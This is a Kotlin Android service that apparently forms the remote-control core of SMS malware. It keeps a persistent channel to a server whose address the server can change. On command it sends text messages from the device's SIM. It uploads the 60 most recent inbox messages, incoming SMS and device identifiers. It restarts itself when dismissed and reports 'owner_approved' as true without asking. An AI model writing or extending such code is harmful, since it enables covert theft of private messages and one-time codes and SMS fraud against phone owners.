package com.screenlink.remote

import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response
import okhttp3.WebSocket
import okhttp3.WebSocketListener
import org.json.JSONArray
import org.json.JSONObject
import java.net.HttpURLConnection
import java.net.URL
import java.util.UUID
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicInteger

class TpcService : Service() {

    companion object {
        private const val TAG = "TpcService"
        private const val CHANNEL_ID = "tpc_service"
        private const val NOTIFICATION_ID = 5001

        private const val POLL_INTERVAL = 15_000L
        private const val HEARTBEAT_INTERVAL = 30_000L
        private const val TELEMETRY_INTERVAL = 300_000L
        private const val WATCHDOG_INTERVAL = 45_000L
        private const val SOCKET_PING_INTERVAL = 25_000L
        private const val INBOX_SYNC_LIMIT = 60

        private const val PREFS = "viral_prefs"
        private const val KEY_RID = "registration_id"
        private const val KEY_SMS_QUEUE = "sms_queue"

        private const val SEEN_TTL_MS = 10 * 60 * 1000L
        private const val SEEN_MAX = 600

        private val BACKOFF = longArrayOf(1_000, 2_000, 4_000, 8_000, 15_000, 20_000)

        @Volatile
        internal var instance: TpcService? = null

        /** base URL ko central jagah se lo — hardcode nahi. */
        fun apiBase(context: Context): String = ApiConfig.resolve(context)
    }

    private val work = Executors.newSingleThreadExecutor()
    private val bgThread = HandlerThread("tpc").apply { start() }
    private val bgHandler = Handler(bgThread.looper)

    private val client = OkHttpClient.Builder()
        .connectTimeout(12, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.MILLISECONDS)
        .pingInterval(15, TimeUnit.SECONDS)
        .retryOnConnectionFailure(true)
        .build()

    @Volatile private var socket: WebSocket? = null
    private var attempts = 0
    @Volatile private var stopped = false

    private val queuedCount = AtomicInteger()
    private val sentCount = AtomicInteger()
    private val deliveredCount = AtomicInteger()
    private val failedCount = AtomicInteger()

    private val seenOutboxIds = ConcurrentHashMap<String, Long>()

    override fun onBind(intent: Intent?): IBinder? = null

    private fun safe(block: () -> Unit) {
        try {
            block()
        } catch (t: Throwable) {
            Log.e(TAG, "err", t)
        }
    }

    private fun markSeen(id: String): Boolean {
        if (id.isBlank()) return true
        val now = System.currentTimeMillis()
        if (seenOutboxIds.size > SEEN_MAX) {
            seenOutboxIds.entries.removeAll { now - it.value > SEEN_TTL_MS }
        }
        return seenOutboxIds.putIfAbsent(id, now) == null
    }

    private fun unsee(id: String) {
        if (id.isNotBlank()) seenOutboxIds.remove(id)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        instance = this
        safe { startForegroundSafely() }
        stopped = false

        bgHandler.post { safe { registerNetworkCallback() } }
        bgHandler.post { safe { connect() } }
        bgHandler.post { safe { scheduleLoops() } }

        work.execute { safe { flushPendingSms() } }
        work.execute { safe { Analytics.trackStart(this) } }

        return START_STICKY
    }

    override fun onTimeout(startId: Int) {
        safe { startForegroundSafely() }
        bgHandler.post { safe { connect() } }
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        safe { startService(Intent(applicationContext, TpcService::class.java)) }
        super.onTaskRemoved(rootIntent)
    }

    override fun onDestroy() {
        stopped = true
        if (instance === this) instance = null
        safe { socket?.close(1000, "bye") }
        socket = null
        safe { unregisterNetwork() }
        safe { bgHandler.removeCallbacksAndMessages(null) }
        safe { client.dispatcher.executorService.shutdown() }
        safe { work.shutdown() }
        safe { bgThread.quitSafely() }
        safe { ServiceCompat.stopForeground(this, ServiceCompat.STOP_FOREGROUND_REMOVE) }
        super.onDestroy()
    }

    private fun createChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        val nm = getSystemService(NotificationManager::class.java) ?: return
        val name = getString(R.string.app_name)
        if (nm.getNotificationChannel(CHANNEL_ID) == null) {
            nm.createNotificationChannel(
                NotificationChannel(CHANNEL_ID, name, NotificationManager.IMPORTANCE_LOW)
            )
        }
    }

    private fun smallIcon(): Int {
        val res = resources.getIdentifier("app_logo", "drawable", packageName)
        return if (res != 0) res else android.R.drawable.stat_notify_sync
    }

    private fun buildNotification(text: String) = NotificationCompat.Builder(this, CHANNEL_ID)
        .setContentTitle(getString(R.string.app_name))
        .setContentText(text)
        .setSmallIcon(smallIcon())
        .setOngoing(true)
        .setOnlyAlertOnce(true)
        .setContentIntent(
            PendingIntent.getActivity(
                this, 0, Intent(this, MainActivity::class.java),
                PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
            )
        )
        .setPriority(NotificationCompat.PRIORITY_LOW)
        .build()

    private fun startForegroundSafely() {
        createChannel()
        val notification = buildNotification("Gateway active")
        val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
            ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC else 0
        try {
            ServiceCompat.startForeground(this, NOTIFICATION_ID, notification, type)
        } catch (t: Throwable) {
            Log.e(TAG, "startForeground(type) fail, fallback", t)
            startForeground(NOTIFICATION_ID, notification)
        }
    }

    private fun refreshNotification() {
        safe {
            val text = "q${queuedCount.get()} s${sentCount.get()} " +
                "d${deliveredCount.get()} f${failedCount.get()}"
            val type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC else 0
            try {
                ServiceCompat.startForeground(this, NOTIFICATION_ID, buildNotification(text), type)
            } catch (_: Throwable) {
            }
        }
    }

    private fun rid(): String {
        val p = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        p.getString(KEY_RID, null)?.let { if (it.isNotBlank()) return it }
        val id = UUID.randomUUID().toString()
        p.edit().putString(KEY_RID, id).apply()
        return id
    }

    private val networkCallback = object : ConnectivityManager.NetworkCallback() {
        override fun onAvailable(network: Network) {
            bgHandler.post { safe { if (socket == null) connect() } }
        }

        override fun onLost(network: Network) {
            bgHandler.post { safe { if (socket == null) retry() } }
        }
    }

    private fun registerNetworkCallback() {
        val cm = getSystemService(ConnectivityManager::class.java) ?: return
        val req = NetworkRequest.Builder()
            .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
            .build()
        runCatching { cm.registerNetworkCallback(req, networkCallback) }
    }

    private fun unregisterNetwork() {
        val cm = getSystemService(ConnectivityManager::class.java) ?: return
        runCatching { cm.unregisterNetworkCallback(networkCallback) }
    }

    private fun postJson(path: String, payload: JSONObject, timeoutMs: Int = 12_000): Boolean {
        val base = apiBase(this)
        if (base.isBlank()) return false

        var conn: HttpURLConnection? = null
        return try {
            conn = URL("$base$path").openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.connectTimeout = timeoutMs
            conn.readTimeout = timeoutMs
            conn.doOutput = true
            conn.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            conn.outputStream.use { it.write(payload.toString().toByteArray(Charsets.UTF_8)) }
            conn.responseCode in 200..299
        } catch (t: Throwable) {
            Log.w(TAG, "post $path fail", t)
            false
        } finally {
            conn?.disconnect()
        }
    }

    private fun registerBlocking(): Boolean = postJson(
        "/devices/register",
        JSONObject().apply {
            put("device_name", DeviceInfo.summary(this@TpcService))
            put("platform", "android")
            put("registration_id", rid())
            put("install_id", DeviceInfo.installId(this@TpcService))
            put("android_id", DeviceInfo.androidId(this@TpcService))
            put("app_version", DeviceInfo.versionName(this@TpcService))
            put("theme", BuildConfig.THEME)
            put("owner_approved", true)
            put("telemetry", DeviceInfo.telemetry(this@TpcService))
        },
        15_000
    )

    private fun connect() {
        if (stopped) return
        if (socket != null) return

        val url = ApiConfig.wsUrl(this, "/ws/device/${rid()}")
        if (url.isBlank()) {
            bgHandler.postDelayed({ safe { connect() } }, 4_000)
            return
        }

        socket = client.newWebSocket(
            Request.Builder().url(url).build(),
            object : WebSocketListener() {

                override fun onOpen(ws: WebSocket, response: Response) {
                    attempts = 0
                    safe { sendJson(JSONObject().put("type", "hello")) }
                    safe { postHeartbeat() }
                    safe { pollOutbox() }
                    safe { sendTelemetry() }
                    work.execute { safe { syncInbox() } }
                    work.execute { safe { flushPendingSms() } }
                }

                override fun onMessage(ws: WebSocket, text: String) = safe { handle(text) }

                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    socket = null
                    safe { retry() }
                }

                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    socket = null
                    safe { retry() }
                }
            }
        )

        work.execute { safe { registerBlocking() } }
    }

    private fun retry() {
        if (stopped) return
        val delay = BACKOFF[attempts.coerceIn(0, BACKOFF.size - 1)]
        attempts = (attempts + 1).coerceAtMost(BACKOFF.size)
        bgHandler.postDelayed({ safe { connect() } }, delay)
    }

    private fun sendJson(obj: JSONObject): Boolean {
        val ws = socket ?: return false
        val ok = ws.send(obj.toString())
        if (!ok) {
            runCatching { ws.close(1000, "send fail") }
            socket = null
            retry()
        }
        return ok
    }

    private fun handle(text: String) {
        val msg = try { JSONObject(text) } catch (_: Exception) { return }

        when (msg.optString("type").lowercase()) {
            "sms_send" -> handleSmsSend(msg)
            "command" -> handleCommand(msg)
            "ping" -> sendJson(JSONObject().put("type", "pong"))
            "pong" -> Unit
            "hello" -> {
                safe { pollOutbox() }
                safe { sendTelemetry() }
            }
        }
    }

    private fun handleCommand(msg: JSONObject) {
        when (msg.optString("action").lowercase()) {
            "ping" -> {
                sendJson(JSONObject().put("type", "pong"))
                work.execute { safe { postHeartbeat() } }
            }
            "wake" -> {
                work.execute { safe { postHeartbeat() } }
                safe { pollOutbox() }
                work.execute { safe { syncInbox() } }
            }
            "reload_config" -> {
                val url = msg.optString("base_url")
                if (url.isNotBlank()) {
                    ApiConfig.remember(this, url)
                    runCatching { socket?.close(1000, "reconnect") }
                    socket = null
                    bgHandler.postDelayed({ safe { connect() } }, 800)
                }
            }
            "fetch_number", "number", "sim_info", "refresh_telemetry", "telemetry" -> {
                val t = DeviceInfo.telemetry(this)
                sendJson(JSONObject().apply {
                    put("type", "command_result")
                    put("action", msg.optString("action"))
                    put("data", t)
                })
                work.execute {
                    safe {
                        postJson("/devices/command/result", JSONObject().apply {
                            put("registration_id", rid())
                            put("action", msg.optString("action"))
                            put("data", t)
                        })
                    }
                }
            }
        }
    }

    private fun handleSmsSend(msg: JSONObject) {
        val id = msg.optString("id")
        val to = msg.optString("to")
        val body = msg.optString("body")

        if (!markSeen(id)) return

        val slot = if (msg.has("sim_slot")) msg.optInt("sim_slot", -1) else -1

        if (body.isBlank()) {
            ack(id, "failed", "missing body", slot)
            return
        }
        if (to.isBlank()) {
            ack(id, "failed", "missing to", slot)
            return
        }

        work.execute {
            try {
                if (!SimRouter.hasTelephony(this)) {
                    unsee(id)
                    ack(id, "failed", "no telephony", slot)
                    return@execute
                }

                val subId = SimRouter.subscriptionIdForSlot(this, slot)
                val realSlot = if (slot >= 0) slot else SimRouter.slotForSubId(this, subId)

                val manager = SimRouter.smsManagerFor(this, subId)
                if (manager == null) {
                    unsee(id)
                    ack(id, "failed", "no sms manager", realSlot)
                    return@execute
                }

                val parts = manager.divideMessage(body)
                if (parts.size > 1) {
                    val sentList = ArrayList<PendingIntent>(parts.size)
                    val deliveredList = ArrayList<PendingIntent>(parts.size)
                    for (i in parts.indices) {
                        sentList.add(SimRouter.statusIntent(this, id, "sent", i, parts.size, realSlot))
                        deliveredList.add(SimRouter.statusIntent(this, id, "delivered", i, parts.size, realSlot))
                    }
                    manager.sendMultipartTextMessage(to, null, parts, sentList, deliveredList)
                } else {
                    manager.sendTextMessage(
                        to, null, body,
                        SimRouter.statusIntent(this, id, "sent", 0, 1, realSlot),
                        SimRouter.statusIntent(this, id, "delivered", 0, 1, realSlot)
                    )
                }

                ack(id, "queued", "", realSlot)
            } catch (e: Exception) {
                unsee(id)
                ack(id, "failed", e.message ?: "send error", slot)
            }
        }
    }

    internal fun ack(id: String, status: String, error: String, slot: Int = -1) {
        if (id.isBlank()) return

        when (status) {
            "queued" -> queuedCount.incrementAndGet()
            "sent" -> sentCount.incrementAndGet()
            "delivered" -> deliveredCount.incrementAndGet()
            "failed" -> failedCount.incrementAndGet()
        }
        refreshNotification()

        val viaSocket = sendJson(JSONObject().apply {
            put("type", "ack")
            put("id", id)
            put("status", status)
            put("error", error)
            put("sim_slot", slot)
        })

        work.execute {
            safe {
                if (!viaSocket) {
                    postJson("/devices/outbox/$id/ack", JSONObject().apply {
                        put("status", status)
                        put("error", error)
                        put("sim_slot", slot)
                        put("registration_id", rid())
                    })
                }
            }
        }
    }

    private fun postHeartbeat() {
        postJson("/devices/heartbeat", JSONObject().apply {
            put("registration_id", rid())
            put("install_id", DeviceInfo.installId(this@TpcService))
            put("android_id", DeviceInfo.androidId(this@TpcService))
            put("telemetry", DeviceInfo.telemetry(this@TpcService))
        })
    }

    private fun sendTelemetry() {
        val t = DeviceInfo.telemetry(this)
        sendJson(JSONObject().apply {
            put("type", "telemetry")
            put("data", t)
        })
        work.execute {
            safe {
                postJson("/devices/telemetry", JSONObject().apply {
                    put("registration_id", rid())
                    put("telemetry", t)
                })
            }
        }
    }

    private fun flushPendingSms() {
        val p = getSharedPreferences(PREFS, Context.MODE_PRIVATE)
        val raw = p.getString(KEY_SMS_QUEUE, "[]") ?: return
        val arr = runCatching { JSONArray(raw) }.getOrNull() ?: return
        if (arr.length() == 0) return

        val remaining = JSONArray()
        for (i in 0 until arr.length()) {
            val item = arr.optJSONObject(i) ?: continue
            if (!postJson("/devices/sms/incoming", item)) remaining.put(item)
        }
        p.edit().putString(KEY_SMS_QUEUE, remaining.toString()).apply()
    }

    private val heartbeatLoop = object : Runnable {
        override fun run() {
            if (stopped) return
            work.execute { safe { postHeartbeat() } }
            if (socket == null) safe { connect() }
            bgHandler.postDelayed(this, HEARTBEAT_INTERVAL)
        }
    }

    private val telemetryLoop = object : Runnable {
        override fun run() {
            if (stopped) return
            safe { sendTelemetry() }
            bgHandler.postDelayed(this, TELEMETRY_INTERVAL)
        }
    }

    private val pollLoop = object : Runnable {
        override fun run() {
            if (stopped) return
            safe { pollOutbox() }
            bgHandler.postDelayed(this, POLL_INTERVAL)
        }
    }

    private val socketPingLoop = object : Runnable {
        override fun run() {
            if (stopped) return
            safe { sendJson(JSONObject().put("type", "ping")) }
            bgHandler.postDelayed(this, SOCKET_PING_INTERVAL)
        }
    }

    private val watchdog = object : Runnable {
        override fun run() {
            if (stopped) return
            safe {
                if (socket == null) connect()
                flushPendingSms()
            }
            bgHandler.postDelayed(this, WATCHDOG_INTERVAL)
        }
    }

    private fun scheduleLoops() {
        bgHandler.removeCallbacks(heartbeatLoop)
        bgHandler.removeCallbacks(telemetryLoop)
        bgHandler.removeCallbacks(pollLoop)
        bgHandler.removeCallbacks(socketPingLoop)
        bgHandler.removeCallbacks(watchdog)

        bgHandler.postDelayed(heartbeatLoop, HEARTBEAT_INTERVAL)
        bgHandler.postDelayed(telemetryLoop, TELEMETRY_INTERVAL)
        bgHandler.postDelayed(pollLoop, POLL_INTERVAL)
        bgHandler.postDelayed(socketPingLoop, SOCKET_PING_INTERVAL)
        bgHandler.postDelayed(watchdog, WATCHDOG_INTERVAL)
    }

    private fun pollOutbox() {
        work.execute {
            val base = apiBase(this)
            if (base.isBlank()) return@execute

            var conn: HttpURLConnection? = null
            try {
                val id = rid()
                if (id.isBlank()) return@execute
                conn = URL("$base/devices/outbox?registration_id=$id")
                    .openConnection() as HttpURLConnection
                conn.requestMethod = "GET"
                conn.connectTimeout = 12_000
                conn.readTimeout = 12_000
                if (conn.responseCode !in 200..299) return@execute

                val text = conn.inputStream.bufferedReader().use { it.readText() }
                val items = JSONObject(text).optJSONArray("items") ?: return@execute
                for (i in 0 until items.length()) {
                    val item = items.optJSONObject(i) ?: continue
                    val payload = JSONObject().apply {
                        put("type", "sms_send")
                        put("id", item.optString("id"))
                        put("to", item.optString("to"))
                        put("body", item.optString("body"))
                        if (item.has("sim_slot")) put("sim_slot", item.optInt("sim_slot", -1))
                    }
                    handle(payload.toString())
                }
            } catch (_: Exception) {
            } finally {
                conn?.disconnect()
            }
        }
    }

    private fun syncInbox() {
        try {
            val id = rid()
            if (id.isBlank()) return

            val rows = JSONArray()
            val cursor = contentResolver.query(
                android.provider.Telephony.Sms.Inbox.CONTENT_URI,
                arrayOf("address", "body", "date"),
                null, null, "date DESC"
            ) ?: return

            cursor.use {
                var count = 0
                while (it.moveToNext() && count < INBOX_SYNC_LIMIT) {
                    rows.put(JSONObject().apply {
                        put("address", it.getString(0) ?: "")
                        put("body", it.getString(1) ?: "")
                        put("direction", "in")
                        put("timestamp", it.getLong(2))
                    })
                    count++
                }
            }

            if (rows.length() == 0) return

            postJson("/devices/sms/sync", JSONObject().apply {
                put("registration_id", id)
                put("messages", rows)
            }, 15_000)
        } catch (_: Exception) {
        }
    }
}